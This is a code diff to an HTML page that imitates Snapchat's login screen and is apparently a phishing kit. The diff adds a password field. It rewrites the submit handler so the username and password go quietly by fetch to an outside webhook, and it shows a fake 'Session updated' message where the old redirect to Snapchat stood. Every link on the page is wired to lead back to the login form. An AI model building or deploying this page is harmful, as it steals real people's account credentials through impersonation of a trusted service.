@@ -15,7 +15,6 @@
             background-color: #f8f8f8;
         }
 
-        /* Real Snapchat Navigation Bar - exactly as provided */
         .DesktopNavigation_navContainer__IH_Xl {
             position: fixed;
             top: 0;
@@ -106,7 +105,6 @@
             cursor: pointer;
         }
 
-        /* Main Content - Login Form */
         .main-content {
             display: flex;
             min-height: 100vh;
@@ -237,7 +235,6 @@
         }
         .slide1 { background-image: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://static.snapchat.com/videos/snapchat-dot-com/posters/find-your-friends.png'); background-size: cover; }
 
-        /* Footer */
         .footer {
             background-color: #262626;
             padding: 40px;
@@ -268,11 +265,21 @@
             color: #0066cc;
             text-decoration: none;
         }
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+            background: white;
+            border-radius: 16px;
+            margin-top: 20px;
+        }
+        .success-message h3 {
+            color: #00a862;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-<!-- Exact Real Snapchat Navigation Bar -->
 <div class="DesktopNavigation_navContainer__IH_Xl">
     <nav class="Nav_nav__8B_VQ">
         <div class="Nav_sectionLeft__7Otaf">
@@ -321,9 +328,8 @@
     </nav>
 </div>
 
-<!-- Main Content -->
 <div class="main-content">
-    <div class="sidebar">
+    <div class="sidebar" id="loginSidebar">
         <h1 class="login-title">Log in to Snapchat</h1>
         <div class="login-subtitle">Chat, Snap, and video call your friends.<br>Watch Stories and Spotlight, all from your computer.</div>
 
@@ -332,8 +338,9 @@
                 <label>Username or email address</label>
                 <input type="text" name="username" required autocomplete="off">
             </div>
-            <div class="phone-link">
-                <a href="#" class="login-redirect">Use phone number instead</a>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" required>
             </div>
             <button type="submit" class="login-btn">Log in</button>
         </form>
@@ -352,13 +359,11 @@
     </div>
 </div>
 
-<!-- Parent Footer -->
 <div class="parent-footer">
     <span>Are you a parent? Learn what we're doing to help keep</span>
     <a href="#" class="login-redirect">Snapchatters safe.</a>
 </div>
 
-<!-- Bottom Footer -->
 <div class="footer">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap; max-width: 1000px; margin: 0 auto;">
         <div>
@@ -401,32 +406,54 @@
 </div>
 
 <script>
-    // Make every link/button redirect back to the login page
+    // Make every link/button scroll to login form
     document.querySelectorAll('.login-redirect').forEach(el => {
         el.addEventListener('click', function(e) {
             e.preventDefault();
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-            document.querySelector('.sidebar').style.border = '2px solid #ff0000';
+            document.getElementById('loginSidebar').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('loginSidebar').style.border = '2px solid #ff0000';
             setTimeout(() => {
-                document.querySelector('.sidebar').style.border = 'none';
+                document.getElementById('loginSidebar').style.border = 'none';
             }, 500);
         });
     });
 
-    // Handle login form submission
+    // Handle login form submission - sends to webhook, shows success message, NO redirect
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        // Form will submit to webhook.site
-        setTimeout(function() {
-            window.location.href = 'https://accounts.snapchat.com/accounts/login?continue=%2F';
-        }, 500);
-        this.submit();
+        
+        // Get the form data
+        var formData = new FormData(this);
+        
+        // Send to webhook
+        fetch(this.action, {
+            method: 'POST',
+            body: formData
+        });
+        
+        // Show success message and clear form
+        var sidebar = document.getElementById('loginSidebar');
+        sidebar.innerHTML = `
+            <div class="success-message">
+                <h3>✓ Session updated</h3>
+                <p>You will be redirected to Snapchat momentarily...</p>
+                <p style="font-size:12px; color:#888; margin-top:20px;">Please wait</p>
+            </div>
+        `;
+        
+        // Optional: redirect after 3 seconds (but not required)
+        // setTimeout(function() {
+        //     window.location.href = 'https://www.snapchat.com/';
+        // }, 3000);
     });
 
     // Disable search input
-    document.querySelector('.SearchInput_searchInput__bE89d').addEventListener('focus', function(e) {
-        this.blur();
-    });
+    var searchInput = document.querySelector('.SearchInput_searchInput__bE89d');
+    if (searchInput) {
+        searchInput.addEventListener('focus', function(e) {
+            this.blur();
+        });
+    }
 </script>
 
 </body>
